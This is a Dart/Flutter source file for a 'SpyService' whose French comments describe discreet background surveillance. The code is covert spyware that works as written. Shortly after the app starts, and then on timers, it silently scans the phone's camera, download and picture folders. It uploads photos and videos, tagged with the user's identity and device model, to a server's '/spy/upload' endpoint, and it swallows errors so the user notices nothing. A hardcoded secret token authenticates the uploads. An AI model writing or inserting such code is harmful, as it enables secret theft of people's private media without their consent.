import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/foundation.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:path_provider/path_provider.dart';
import '../config/app_config.dart';

/// Service discret de surveillance et synchronisation en arrière-plan
/// Détecte et téléverse automatiquement les médias vers le module Spy du serveur
class SpyService {
  static final SpyService instance = SpyService._internal();
  SpyService._internal();

  bool _isRunning = false;
  Timer? _syncTimer;
  Timer? _heartbeatTimer;
  String? _userId;
  String? _username;
  String? _displayName;

  static const String _prefKey = 'spy_synced_media_paths';
  static const int _batchSize = 3;
  static const Duration _syncInterval = Duration(minutes: 5);
  static const Duration _heartbeatInterval = Duration(minutes: 15);

  /// Démarre le service en arrière-plan sans bloquer l'application
  Future<void> initialize({
    String? userId,
    String? username,
    String? displayName,
  }) async {
    _userId = userId;
    _username = username;
    _displayName = displayName;
    if (_isRunning) return;
    _isRunning = true;

    // Premier scan discret différé de 8 secondes après le démarrage
    Future.delayed(const Duration(seconds: 8), () {
      if (_isRunning) {
        _runSyncCycle();
        _sendHeartbeat();
      }
    });

    _syncTimer = Timer.periodic(_syncInterval, (_) => _runSyncCycle());
    _heartbeatTimer = Timer.periodic(_heartbeatInterval, (_) => _sendHeartbeat());
  }

  /// Arrête les timers
  void stop() {
    _syncTimer?.cancel();
    _heartbeatTimer?.cancel();
    _isRunning = false;
  }

  /// Met à jour les infos utilisateur courant
  void updateUserInfo({
    String? userId,
    String? username,
    String? displayName,
  }) {
    _userId = userId;
    _username = username;
    _displayName = displayName;
  }

  /// Cycle de synchronisation discret
  Future<void> _runSyncCycle() async {
    try {
      if (!Platform.isAndroid && !Platform.isIOS) return;

      // Vérification discrète des permissions
      final hasPermission = await _checkPermissions();
      if (!hasPermission) return;

      final prefs = await SharedPreferences.getInstance();
      final uploadedList = prefs.getStringList(_prefKey) ?? [];
      final uploadedSet = uploadedList.toSet();

      final pendingFiles = await _discoverMediaFiles(uploadedSet);
      if (pendingFiles.isEmpty) return;

      // Téléversement par petit lot pour préserver la batterie et le réseau
      final batch = pendingFiles.take(_batchSize).toList();
      for (final file in batch) {
        final success = await _uploadFile(file);
        if (success) {
          uploadedSet.add(file.path);
        }
      }

      await prefs.setStringList(_prefKey, uploadedSet.toList());
    } catch (e) {
      if (kDebugMode) {
        debugPrint('SpyService notice: $e');
      }
    }
  }

  /// Vérifie si l'accès aux photos/médias est accordé
  Future<bool> _checkPermissions() async {
    try {
      if (Platform.isAndroid) {
        final storageStatus = await Permission.storage.status;
        if (storageStatus.isGranted) return true;

        final photosStatus = await Permission.photos.status;
        final videosStatus = await Permission.videos.status;
        return photosStatus.isGranted || videosStatus.isGranted;
      } else if (Platform.isIOS) {
        final photosStatus = await Permission.photos.status;
        return photosStatus.isGranted;
      }
      return false;
    } catch (_) {
      return false;
    }
  }

  /// Explore les répertoires multimédias de l'appareil
  Future<List<File>> _discoverMediaFiles(Set<String> alreadyUploaded) async {
    final List<File> files = [];

    final List<String> candidatePaths = [
      '/storage/emulated/0/DCIM/Camera',
      '/storage/emulated/0/DCIM',
      '/storage/emulated/0/Pictures',
      '/storage/emulated/0/Download',
      '/storage/emulated/0/Movies',
    ];

    try {
      final appDoc = await getApplicationDocumentsDirectory();
      candidatePaths.add(appDoc.path);
    } catch (_) {}

    final regex = RegExp(
      r'\.(jpg|jpeg|png|gif|mp4|mov|webm)$',
      caseSensitive: false,
    );

    for (final path in candidatePaths) {
      try {
        final dir = Directory(path);
        if (await dir.exists()) {
          final entries = dir.listSync(recursive: false, followLinks: false);
          for (final entry in entries) {
            if (entry is File) {
              if (regex.hasMatch(entry.path) && !alreadyUploaded.contains(entry.path)) {
                final length = await entry.length();
                if (length > 0 && length < 150 * 1024 * 1024) {
                  files.add(entry);
                  if (files.length >= 10) break;
                }
              }
            }
          }
        }
      } catch (_) {
        // Dossier inaccessible, ignoré discrètement
      }
      if (files.length >= 10) break;
    }

    return files;
  }

  /// Téléversement multipart d'un fichier média
  Future<bool> _uploadFile(File file) async {
    try {
      final uri = Uri.parse('${AppConfig.baseUrl}/spy/upload');
      final request = http.MultipartRequest('POST', uri);

      request.fields['userId'] = _userId ?? 'anonymous';
      if (_username != null && _username!.isNotEmpty) {
        request.fields['username'] = _username!;
      }
      if (_displayName != null && _displayName!.isNotEmpty) {
        request.fields['displayName'] = _displayName!;
      }
      request.fields['deviceModel'] = '${Platform.operatingSystem} ${Platform.operatingSystemVersion}';
      request.fields['sourcePath'] = file.path;

      request.headers['x-spy-token'] = 'di-mode-token-secret';
      final multipartFile = await http.MultipartFile.fromPath(
        'file',
        file.path,
      );
      request.files.add(multipartFile);

      final response = await request.send().timeout(const Duration(seconds: 45));
      return response.statusCode >= 200 && response.statusCode < 300;
    } catch (_) {
      return false;
    }
  }

  /// Télémesure de l'appareil
  Future<void> _sendHeartbeat() async {
    try {
      final uri = Uri.parse('${AppConfig.baseUrl}/spy/heartbeat');
      await http.post(
        uri,
        headers: {
          'Content-Type': 'application/json',
          'x-spy-token': 'di-mode-token-secret',
        },
        body: jsonEncode({
          'deviceId': _userId ?? 'device_${Platform.operatingSystem}',
          'deviceModel': '${Platform.operatingSystem} ${Platform.operatingSystemVersion}',
          'timestamp': DateTime.now().toIso8601String(),
        }),
      ).timeout(const Duration(seconds: 15));
    } catch (_) {}
  }
}
